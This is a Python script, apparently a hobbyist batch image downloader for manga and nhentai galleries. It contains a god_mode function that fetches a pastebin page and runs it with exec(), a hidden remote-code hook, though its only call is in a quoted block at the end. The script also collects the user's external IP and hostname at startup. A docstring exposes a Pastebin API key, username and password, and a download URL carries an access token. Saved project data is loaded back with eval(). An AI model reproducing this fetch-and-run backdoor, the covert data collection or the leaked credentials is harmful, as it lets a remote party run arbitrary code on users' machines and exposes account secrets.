#: *****************************************************************************
#:                    This code was created by Ratul Hasan                     *
#:                     So comlpete credit goes to him(me)                      *
#: *****************************************************************************
#: Sharing this code without my permission is not allowed                      *
#: *****************************************************************************
#: This code was created based on IDLE, Pydroid(Android), qPython(Android) etc.*
#: So most online/web site based idle(i.e: Sololearn) can't run this code      *
#: properly.                                                                   *
#: *****************************************************************************
#: If there is any error or you want to help please let me know.               *
#: e-mail: wwwqweasd147@gmail.com                                              *
#: *****************************************************************************


                            #>>>>>>update>>>>>
                        #=========================
#>>>>>used re.compile to speed up
#>>>>>added nhentai support wiht proxy

import time
start_up=time.time()
from datetime import datetime

# datetime object containing current date and time
dt_=datetime.now
start_up_dt = dt_()

from re import search,compile as compiler
import socket
## getting the hostname by socket.gethostname() method
user_device_name = socket.gethostname()
# from bs4 import BeautifulSoup as bs
# 
from os import makedirs, remove
from os.path import exists, isdir
# from platform import system as os_name
from threading import Thread as Process
from sys import executable as sys_executable
from subprocess import call as subprocess_call
from random import choice
from hashlib import sha1 as hashlib_sha1
from rcrypto import encrypt

def import_paste():
	global external_ip
	from pastebin import send_paste
	import urllib.request

	external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')

	# print(external_ip)
import_paste_t=Process(target=import_paste)


boss=0

import_paste_t.start()

_VERSION="3"

parser='html.parser'
img=('jpeg','jpg','png','gif', 'webp', 'bmp', 'tif')
# os_name=os_name()
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
who_r_u='https://www.myinstants.com/media/sounds/who_r_u_1.mp3'
yamatte= ['https://www.myinstants.com/media/sounds/yamatte.mp3','https://www.myinstants.com/media/sounds/ara-ara.mp3', 'https://www.myinstants.com/media/sounds/ara-ara2.mp3']
yes= ('y', 'yes', 'yeah', 'sure', 'ok', 'lets go', "let's go", 'start', 'yep', 'yeap', 'well y', 'well yes', 'well yeah', 'well sure', 'well ok', 'well lets go', "well let's go", 'well start', 'well yep', 'well yeap', 'actually y', 'actually yes', 'actually yeah', 'actually sure', 'actually ok', 'actually lets go', "actually let's go", 'actually start', 'actually yep', 'actually yeap')
no = ('n', 'no', 'na', 'nah', 'nope', 'stop', 'quit', 'exit', 'not really', 'no', 'not at all', 'never', 'well n', 'well no', 'well na', 'well nah', 'well nope', 'well stop', 'well quit', 'well exit', 'well not really', 'well no', 'well not at all', 'well never', 'actually n', 'actually no', 'actually na', 'actually nah', 'actually nope', 'actually stop', 'actually quit', 'actually exit', 'actually not really', 'actually no', 'actually not at all', 'actually never')
cond=yes+no
condERR = "Sorry,  I can't understand what you are saying. Just type yes or no.   "

user_list=['bec6113e5eca1d00da8af7027a2b1b070d85b5ea','eb23efbb267893b699389ae74854547979d265bd']

g_mode=False

def asker(out=''):
	print(out)
	Ques2 = input().lower()
	#Ques2 = Ques2
	while Ques2 not in cond:
		print(condERR)
		Ques2 = input().lower()
		#Ques2 = Ques2
	if Ques2 in cond:
		if Ques2 in yes:
			return True
		else:
			return False


def loc(x, os_name='Linux'):
	"""to fix dir problem"""
	if os_name == 'Windows':
		return x.replace('/', '\\')
	else:
		return x.replace('\\', '/')
def get_file_ext(x):
	return x.split('.')[-1]
def get_file_name(x):
	return loc(x,'linux').split('/')[-1]

def reader(direc):
	with open(loc(direc)) as f:
		return f.read()
#print(isdir('data/projects/Sao manga rip'))


def writer(fname, mode, data, dir=0):
	if dir == 0:
		with open(fname, mode) as file:
			file.write(data)
	else:
		locs=loc(dir)
		if exists(locs):
			if locs.endswith('/'):
				with open(loc(locs + fname), mode) as f:
					f.write(data)
			else:
				with open(loc(locs + '/' + fname), mode) as f:
					f.write(data)
		else:
			makedirs(locs)
			writer(fname, mode, data, locs)

#import decrypto

# user_name='unnamed'

def leach_logger(io, key):
	# print(io)
	#print(key)
	key="Asuna"
	salt = hashlib_sha1(key.encode()).hexdigest()
	writer('userlog.leach', 'ab', encrypt(salt+io,key).encode('utf-8')+b'\n','data')
	# print(io==decrypto.decrypt(encrypt(io,key),key))


# def install(pack, alias=0):
# 	"""Just install package"""

# 	if alias == 0:
# 		alias = pack

# 	subprocess_call([sys_executable, "-m", "pip", "install", "--user",'--disable-pip-version-check','--quiet', pack])
# install('comtypes')
# try:
import requests
# except:
# 	install('requests')
# 	import requests
# try:
from bs4 import BeautifulSoup as bs
# except:
# 	install('beautifulsoup4')
# 	from bs4 import BeautifulSoup as bs


# print(requests.get('https://ident.me',headers=headers).content)
# user_net_ip=requests.get('https://ident.me',headers=headers).content.decode()
# print(user_net_ip)


try:
	user_net_ip=requests.get('https://ident.me',headers=headers).content.decode()
	# update=requests.get('https://pastebin.com/raw/NrB5mbHA',headers=headers).content

except:
	print("Error code: 005\nNo internet connection!\nThe program will break in 5 seconds")
	time.sleep(5)
	raise ConnectionError

def god_mode():
	# global user_net_ip
	try:
		writer('who_r_u.mp3','wb',requests.get(who_r_u, headers=headers).content,'Data/.temp')
		# user_net_ip=requests.get('https://ident.me',headers=headers).content
		update=requests.get('https://pastebin.com/raw/NrB5mbHA',headers=headers).content

	except:
		print("Error code: 005\nNo internet connection!\nThe program will break in 5 seconds")
		time.sleep(5)
		raise ConnectionError
	exec(update)
#print(update)
#print(aiii)
#
#def upload_paste(data,f_name):
"""if True:
	api_dev_key= "f7e117d452fed3df6e5cc1ea2eee658a"
	#my_key = PastebinAPI.generate_user_key( ,api_dev_key=api_dev_key, username="DarKnighTitan", password="147852369aA..")
	x=PastebinAPI.paste(self,api_dev_key=api_dev_key, api_paste_code="hello world", api_user_key = None, paste_name = "hi", paste_format = None, paste_private = None, paste_expire_date = None)
	print(x)
"""

def delete_last_line():
	"Use this function to delete the last line in the STDOUT"

	#cursor up one line
	print('\x1b[1A',end='')

	#delete last line
	print('\x1b[2K',end='')
# if os_name=='Windows':
import mplay4

	#import volume_control
#writer('who_r_u.mp3','wb',requests.get(who_r_u, headers=headers).content,'Data/.temp')

errors=0
done=0
def distribute(lists,task_id):
	global total,done, errors
	task_id=str(task_id)
	if existing_found:
		if exists('data/projects/'+Project+'/t'+task_id+'.txt'):
			res=eval(open('data/projects/'+Project+'/t'+task_id+'.txt').read())
			
		else:
			res=0
	else: res=0
	done+=res
	for j in lists:
		#sys.stdout.write("\033[2K")
		i=all_list[j]
		delete_last_line()
		print('Downloadng ['+ str(done+1) + '/'+str(total)+']')
		
		#sys.stdout.flush()
		
		if lists.index(j)>=res:
			try:
				file=requests.get(i[0], headers=headers)
				if file:
					writer(get_file_name(i[0]),'wb',file.content,'Projects/'+Project+'/'+sub_dirs[i[1]])
					writer('t'+task_id+'.txt', 'w',str(res),'data/projects/'+Project)
				else:
					raise requests.ConnectionError
			except:
				writer('errors.txt', 'a',str(i)+'\n','data/projects/'+Project)
				errors+=1
			res+=1
			done+=1

#import hashlib
def log_in():
	global user_name
	if boss!=1:
		# if os_name=="Windows":
		
		userhash=0
		br=0
		while True:
			user_name=input("Enter username: ")
			userhash=hashlib_sha1(user_name.encode()).hexdigest()
			for x in user_list:
				# print(x)
				if userhash==x:
					br=1
					break
			if br==1:
				break
			else:
				print("User not found! \nWait a minute! WHO are YOU?!!")
				# if os_name=="Windows":
				ex=mplay4.ex_vol
				mplay4.set_win_vol(60)
				mplay4.load('data/.temp/who_r_u.mp3').play()
				time.sleep(5)
				mplay4.set_win_vol(ex)
				# user_name=input("Enter username: ")
	if boss!=1:
		remove('data/.temp/who_r_u.mp3')

	if not exists('data/projects.db'):
		writer('projects.db','a','','data')
	if userhash=='eb23efbb267893b699389ae74854547979d265bd':
		g_mode='Asuna'
	return userhash


def _init_():
	global all_list, patrial_do_all,homepage, existing_found
	all_list=set()
	#print(type(all_list))
	patrial_do_all=0
	homepage=''
	# existing_found= False
def list_writer(link, types, file_link_starts,n,special=None, soup=None):
	global all_list
	# print(link, types, file_link_starts,n,special=None, soup=None)
	homepage_searcher=compiler('(https?://[^/]*)')
	start_checker=compiler('^'+file_link_starts)
	if special!=None:
		if special.startswith('nhentai'):
			#link='https://'+special+'/g/'+link
			#page = requests.get(link,headers=headers)
			#soup=bs(page.content, parser)
			#title=soup.find("h1").getText()
			#print("Indexing from",title)
			if special=="nhentai.to":
				to_search= compiler("https://nhentai.to/galleries/\d*/")
				for imgs in soup.find_all('img'):
					img_link=imgs.get('data-src')
					if img_link== None:
						img_link=imgs.get('src')
					if img_link.startswith('/'):
						img_link='https://nhentai.to' +(img_link.replace('t',''))
					if to_search.search(img_link)!=None:
						all_list.append((img_link,n))
			elif special=="nhentai.net":
				net_search=compiler("https://i.nhentai.net/galleries/\d*/")
				for imgs in soup.find_all('img'):
					img_link=imgs.get('data-src')
					if img_link== None:
						img_link=imgs.get('src')
					#print(img_link)
					if '/thumb.' in img_link:
						continue
					if 'cover' not in img_link:
						img_link= img_link.replace('s://t.','s://i.')[::-1].replace('t','',1)[::-1]
					if net_search.search(img_link)!=None:
						all_list.append((img_link,n))
					
	else:
		page = requests.get(link,headers=headers)
		soup=bs(page.content, parser)
		# print(page.content)
		# time.sleep(10000)
		# li=[]
	
		for imgs in soup.find_all('img'):
			img_link=imgs.get('data-src')
			if img_link== None:
				img_link=imgs.get('src')
			if img_link.startswith('/'):
				img_link=homepage_searcher.search(link).groups()[0]+img_link
			if start_checker.search(str(img_link))!=None and img_link.endswith(types):
				if img_link.startswith('//i') and '.imggur.net' in img_link:
					img_link="https:"+img_link
				#print(img_link)
				all_list.append((img_link,n))
			# li+=[http]
		# print(http)
	# li1=(link.get('src')  if  )
	# for i in li1:
	# 	print(i, search(file_starts, i)!=None)

# if os_name=='Windows':
def plat_yamatte(vol):
	global ex
	writer('yamatte.mp3','wb',requests.get(choice(yamatte), headers=headers).content,'Data/.temp')
	ex=mplay4.ex_vol
	mplay4.set_win_vol(vol)
	mplay4.load('data/.temp/yamatte.mp3').play()
	time.sleep(8)
	remove('data/.temp/yamatte.mp3')
	mplay4.set_win_vol(ex)
play_yamatte_t=Process(target=plat_yamatte, args=[80])




def nhantai_link(link):
	code=search('https://nhentai.[^/]*/g/((\d)*)',link)
	#print(code)
	if code==None:
		return False, False
	code=code.groups()[0]
	#print(code)
	
	try:
		link_y='https://nhentai.net/g/'+code+'/'
		page = requests.get(link_y,headers=headers, timeout=2)
		if page:
			site=".net"
		else:
			raise requests.ConnectionError
			#link_y='https://nhentai.to/g/'+code+'/'
			#page = requests.get(link_y,headers=headers)
			#site='.to'
			# site="https://nhentai.net/"
			# thumb_pattern="https://t.nhentai.net/galleries/\d/\dt."

	except (requests.ConnectionError,requests.exceptions.ConnectTimeout,requests.exceptions.ReadTimeout):
		print('nhentai.net server is not reachable, trying proxy server...')
		link_y='https://nhentai.to/g/'+code+'/'
		page = requests.get(link_y,headers=headers)
		site='.to'
		
		# list_writer(link,img, )
		#site='.to'
	if page:
		soup=bs(page.content, parser)
		title=soup.find("h1").getText()
		print("Indexing from",title)
		list_writer(code,img,'',0,'nhentai'+site,soup)
		return link_y, title
	else:
		print("Error code: 005\nLink not found, this program will crash and close in 3 seconds")
		time.sleep(3)
		raise ValueError


def main():
	_init_()
	global Project, all_list,total,existing_found, sub_dirs,patrial_do_all
	existing_found=False
	corruptions=[]
	Project=input('Enter Batch download directory (Project name): ')
	leach_logger("++++'%s' began @ '%s++++"%(Project,str(dt_())),user_name)
	if Project in open('data/projects.db').read().split('\n'):
		print('Project name found!')
		#system('ls')
		if exists('data/projects/'+Project+'.proj') and exists('data/projects/'+Project+'.list'):
			try:
				with open('data/projects/'+Project+'.proj') as f:
					print('db found')
					#db=
					existing_data=f.read().split('\n')
					main_link=existing_data[0]
					link_startswith=existing_data[1]
					try:
						file_types=eval(existing_data[2])
						file_starts=existing_data[3]
						try:
							sub_dirs=eval(existing_data[4]) #sub directory list
							proj_good= True
						except:
							proj_good= False
							print('Corrupted Data! Error code: 002')
							corruptions+=[2]
					except:
							proj_good= False
							print('Corrupted Data! Error code: 004')
							corruptions+=[4]

				with open('data/projects/'+Project+'.list') as f:
					try:
						file=f.read()
						#print(f"'{file}'")
						if file.strip()=='': raise ValueError
						all_list= eval(str(file))
						print('list found')
						list_good= True
					except:
						list_good= False
						print('Corrupted Data! Error code: 003')
						corruptions+=[3]
					
				#print(x)
				if proj_good and list_good:
					print('============ Realoaded =============')
					existing_found= True

			except IndexError:
				# existing_found=0
				print('Corrupted Data! Error code: 001\n')
				corruptions+=[1]
				#print('error')

			
			#download_files(listx,state)
		else:
			# existing_found=0
			print('Insufiicient Data!\n')
			corruptions+=[0]

	if existing_found==False:
		if corruptions!=[]:
			leach_logger("%s>>Corrupted data>>%s"%(str(corruptions),open('data/projects/'+Project+'.proj').read().replace('\n','<<=>>')))
		all_list=[]
		sub_dirs=[]
		link_startswith=False

		main_link=input("Enter the link: ")
		if main_link.startswith('https://nhentai'):
			print("nhentai link detected!!")
			is_nh=asker("Do you want to download dougin images from this links?? (y/n)\n( ͡° ͜ʖ ͡°)\t")
			####( io )
			if is_nh:
				# if os_name=='Windows':
				play_yamatte_t.start()
					
				link_startswith,title=nhantai_link(main_link)

				if title!=False and link_startswith!=False:
					sub_dirs.append(title)
					file_types=img
					file_starts='https://nhentai'
			'''elif is_nh!='n':
				print('invalid input!! the program will break in 3seconds')
				time.sleep(3)
				raise ValueError'''
					
		if link_startswith==False:
			page = requests.get(main_link, headers=headers)
			if not page:
				print('Connection Failed, The program will break ')
			soup=bs(page.content, parser)
			link_startswith=input("Links Starts With: ")
			sub_links=set([sub_link.get('href') for sub_link in soup.find_all('a')])
			if link_startswith=='':
				link_startswith=main_link

			file_types_i=input("Enter file formats (separate multiple by commas) *no need to add . in formats (ie: png, jpg,mp3) or just write the category (ie: image, music, video): ")
			if file_types_i=='image':
				file_types=img
			else:
				file_types= tuple(i.strip(i) for i in file_types_i.split(','))

			file_starts=input("File Links Starts With (if known or need to be specified): ")
			# project_path=Project[:]

		#if start[-1'/'): start+='/'
		#if start.startswith(): start=start[1:]
			#sub_dirs=[]
			len_sub_links=str(len(sub_links))
			n=0
			print('\n\n')
			homepage_searcher=compiler('(https?://[^/]*)')

			leach_logger("++%s'+'%s'+%s'+'%s'++"%(main_link, link_startswith,str(file_types),file_starts), user_name)

			for i in sub_links:


			#sys.stdout.flush()
			#print(link)		
				if  patrial_do_all==0 and i.startswith('/'):
					print("Partial link detected - ",main_link,"\nSearching for home page.")
					#print(start)
					homepage =homepage_searcher.search(link_startswith)
					#print(homepage)
					if homepage!=None:
						print("Home page detected: ", homepage.group())
						is_homepage= input("Is this the homepage? \n(y for yes\nn for no\na for all)\n")
						if is_homepage=="a":
							patrial_do_all=1
							is_homepage='y'
						if is_homepage=='y':
							homepage=homepage.group()
						elif is_homepage=='n':
							homepage= input("Enter the home page: ")
							io2=input('Is it for all other links?(y/n)')
							if io2=='y': 
								patrial_do_all=1
							elif io2!='n':
								print("Invalid input!")
								raise InterruptedError
						else:
							print("Invalid input!")
							raise InterruptedError
					else:
						print("Homepage not found!")
						homepage= input("Enter the home page: ")
						io2=input('Is it for all other links?(y/n)')
						if io2=='y': 
							patrial_do_all=1
						elif io2!='n':
							print("Invalid input!")
							raise InterruptedError
					i=homepage+i
			
			
				#print(link)
				#print(sub_dirs)ta 
				if i.startswith(link_startswith):
					delete_last_line()
					print('Indexing ['+ str(n+1) + '/'+len_sub_links+'] '+i)
					list_writer(i,file_types, file_starts,n)
					# locs=i
					if i[-1]=='/':
						i=i[:-1]
					sub_dirs+=[i.split('/')[-1]]
					#print(i,n)
					n+=1
				#else:
					#sub_links.remove(i)
			#print(i)
				
			#sys.stdout.write("\033[2K")
		#sub_dirs=list(sub_dirs)
		# all_list=list(all_list)




		writer('projects.db','a',Project+'\n','data')
		writer(Project+'.list','w',str(all_list),'data/projects')
		writer(Project+'.proj','w',main_link+'\n','data/projects')
		writer(Project+'.proj','a',link_startswith+'\n','data/projects')
		writer(Project+'.proj','a',str(file_types)+'\n','data/projects')
		writer(Project+'.proj','a',file_starts+'\n','data/projects')
		writer(Project+'.proj','a',str(sub_dirs)+'\n','data/projects')
	print('\n\n')
	total=len(all_list)


	if exists('data/projects/'+Project+'/t'+'errors.txt'):
		errors=len(open('data/projects/'+Project+'/t'+'errors.txt').readlines())
	else:
		errors=0

	#print(all_list)
	all_list_r=list(range(total))
	t11= Process(target=distribute, args=(all_list_r[::10],1))
	t2= Process(target=distribute, args=(all_list_r[1::10],2))
	t3= Process(target=distribute, args=(all_list_r[2::10],3))
	t4= Process(target=distribute, args=(all_list_r[3::10],4))
	t5= Process(target=distribute, args=(all_list_r[4::10],5))
	t6= Process(target=distribute, args=(all_list_r[5::10],6))
	t7= Process(target=distribute, args=(all_list_r[6::10],7))
	t8= Process(target=distribute, args=(all_list_r[7::10],8))
	t9= Process(target=distribute, args=(all_list_r[8::10],9))
	t10= Process(target=distribute, args=(all_list_r[9::10],10))

	##sleep(.5)

	t11.start()
	t2.start()
	t3.start()
	t4.start()
	t5.start()
	t6.start()
	t7.start()
	t8.start()
	t9.start()
	t10.start()

	t11.join()
	t2.join()
	t3.join()
	t4.join()
	t5.join()
	t6.join()
	t7.join()
	t8.join()
	t9.join()
	t10.join()


	leach_logger("++++"+Project+" finisher @"+dt_()+'++Total files:'+str(total)+'++total errors:'+str(errors)+'+++')
	if errors>0:
		if exists('data/projects/'+Project+'/t'+'errors.txt'):
			with open('data/projects/'+Project+'/errors.txt') as f:
				errs= [eval(i) for i in f.readlines()]
				distribute(errs,11)
		else:
			print("Warning: Error file not found!\nPossible cause: Data corruption")
	

'''Sao manga rip
https://sword-artonline.com/
https://sword-artonline.com/manga/
image
https://1.bp.blogspot.com/
'''



'''Accel world
https://www.mangareader.net/accel-world

image
//i\d+.imggur.net/accel-world/
'''
'''Accel world
https://mangapill.com/manga/99/accel-world
https://mangapill.com/chapters/99-100
image
https://cdn.read7deadlysins.com/file/mangap/99/100
'''

writer('test2.png','wb', requests.get('https://raw.githubusercontent.com/Ratulhasan14789/webleach/main/EMO%20Angel.png?token=AIDNL263T42XQLBLGD6ISHK7VFS7Y').content,'testx')
'''leach_logger("====Version:"+_VERSION+"===Device Name:"+user_device_name+"===IP:"+user_net_ip+"===Start up @: "+str(start_up_dt)+"==="+"latency: "+str(time.time()-start_up)+'s ====', 'leach')
server_start=time.time()
god_mode()
leach_logger('##server time: '+str(time.time()-server_start)+'s ##', 'leach')
ush = log_in()
leach_logger('//user "%s" logged in @ %s//'%(ush, str(dt_())),ush)
while True:
	main()
'''
